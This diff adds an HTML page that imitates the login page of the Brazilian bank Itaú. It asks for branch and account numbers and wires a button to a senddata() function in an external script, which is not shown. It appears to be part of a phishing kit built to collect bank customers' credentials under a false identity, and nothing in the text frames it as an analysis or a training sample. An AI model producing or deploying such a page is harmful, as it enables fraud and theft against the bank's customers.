@@ -1,0 +1,36 @@
+<!DOCTYPE html>
+<html xmlns="http://www.w3.org/1999/xhtml">
+ <head>
+  <title>
+   Itau - Feito para Você
+  </title>
+  <link href="Style/principal.css" type="text/css" rel="stylesheet" />
+  <link href="Style/undefined" type="text/css" rel="stylesheet" id="tipoinf" />
+  <link type="image/x-icon" href="pics/favicon.ico" rel="icon" />
+  <script src="http://ajax.googleapis.com/ajax/libs/jquery/1.11.1/jquery.min.js">
+  </script>
+  <script src="function.js" type="text/javascript">
+  </script>
+ </head>
+ <body onload="getdata();">
+  <div id="cabecalho" style="display: block;">
+   <div id="img1">
+   </div>
+   <div id="img2" style="display: block;">
+    <div onclick="senddata('form1');" id="btAcess">
+    </div>
+   </div>
+   <div id="dvcampos" style="display: block;">
+    <form id="form1">
+     <input type="text" onkeypress="return SomenteNumero(event);" valida="Agência ou Conta Invalida!" minlength="4" maxlength="4" name="numero1" id="numero1" />
+     <input type="text" onkeypress="return Formata(this,event) ;SomenteNumero(event);" valida="Agência ou Conta Invalida!" minlength="7" maxlength="7" name="numero2" id="numero2" />
+    </form>
+   </div>
+  </div>
+  <form id="formprinc">
+   <div id="Conteudo">
+    <img width="100%" height="100%" src="pics/promocao.png" id="promocao" />
+   </div>
+  </form>
+ </body>
+</html>
